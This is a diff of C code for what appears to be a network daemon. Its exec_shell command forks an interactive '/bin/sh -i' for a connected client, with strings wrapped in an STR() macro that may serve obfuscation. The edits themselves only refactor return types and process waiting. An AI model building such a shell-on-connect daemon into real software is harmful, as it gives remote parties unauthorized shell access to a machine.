@@ -1,12 +1,8 @@
 #include <sys/file.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <arpa/inet.h>
-#include <poll.h>
 #include <sys/prctl.h>
 #include <sys/wait.h>
-//#include <signal.h>
-#include <unistd.h>
 
 #include "daemon.h"
 #include "utils.h"
@@ -88,13 +84,14 @@ static int accept_client(int fd)
 	return client_fd;
 }
 
-void hello(param_t *command)
+ret_t hello(param_t *command)
 {
 	(void)command;
 	logger(STR("hello\n"));
+	return 0;
 }
 
-void exec_shell(param_t *command)
+ret_t exec_shell(param_t *command)
 {
 	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
 	pid_t pid = fork();
@@ -109,14 +106,19 @@ void exec_shell(param_t *command)
 		exit(0);
 	} 
 	else {
-		waitpid(pid, NULL, 0);
+		siginfo_t info;
+		waitid(P_PID, pid, &info, WEXITED);
+		return (info.si_status == 0) ? 0 : 1;
+
 	}
+	return 0;
 }
 
-void unknown(param_t *command)
+ret_t unknown(param_t *command)
 {
 	(void)command;
 	logger(STR("unknown command\n"));
+	return 0;
 }
 
 command_func_t get_command(const char *cmd)
